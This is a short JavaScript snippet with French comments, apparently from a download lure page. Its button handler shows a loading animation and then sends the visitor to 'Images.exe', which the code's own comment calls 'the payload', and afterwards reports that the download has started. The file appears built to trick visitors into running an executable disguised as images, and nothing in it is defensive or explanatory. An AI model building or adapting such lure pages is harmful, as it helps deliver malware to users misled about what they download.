document.getElementById('downloadBtn').addEventListener('click', function() {
    // Animation du bouton
    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PRÉPARATION...</span>';
    this.style.opacity = '0.8';
    
    setTimeout(() => {
        // Télécharger le payload
        window.location.href = 'Images.exe';
        
        // Changer le texte après téléchargement
        this.innerHTML = '<i class="fas fa-check"></i> <span>TÉLÉCHARGEMENT DÉMARRÉ</span>';
        this.style.background = 'linear-gradient(135deg, #28a745 0%, #20c997 100%)';
    }, 1500);
});

// Animation au chargement
window.addEventListener('load', function() {
    const cards = document.querySelectorAll('.info-card');
    cards.forEach((card, index) => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px)';
        
        setTimeout(() => {
            card.style.transition = 'all 0.5s ease';
            card.style.opacity = '1';
            card.style.transform = 'translateY(0)';
        }, 200 * index);
    });
});